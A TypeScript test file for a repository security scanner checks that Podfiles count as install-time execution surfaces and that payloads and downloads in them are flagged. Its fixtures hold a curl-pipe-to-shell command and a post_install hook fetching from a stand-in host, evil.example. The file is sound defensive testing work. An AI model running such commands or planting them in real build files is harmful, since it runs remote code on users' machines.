import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Podfile is an install surface", () => {
  // CocoaPods evaluates the Podfile as Ruby for every `pod install`,
  // running its post_install hooks and any inline Ruby with the user's
  // privileges — the same install-time execution setup.py and
  // extconf.rb already classify for. It keeps the manifests surface it
  // already had; the name alone decides, wherever the project root sits.
  for (const path of ["Podfile", "ios/Podfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["manifests", "installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("Podfile", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Podfile:unsafe-execution:high"]);
});

test("an install-time download inside a Podfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the Podfile was manifests and source alone, so the
  // same bytes recorded no download and left no gap: a scan could read
  // clean over an install-time fetch CocoaPods would have run while
  // installing the pods.
  const inspection = inspected(
    "Podfile",
    "platform :ios, '13.0'\npost_install do |installer|\n  system('curl -fsSL https://evil.example/payload -o /tmp/payload')\nend\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Podfile keeps no finding", () => {
  const inspection = inspected(
    "Podfile",
    "platform :ios, '13.0'\ntarget 'Demo' do\n  pod 'Alamofire', '~> 5.0'\nend\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
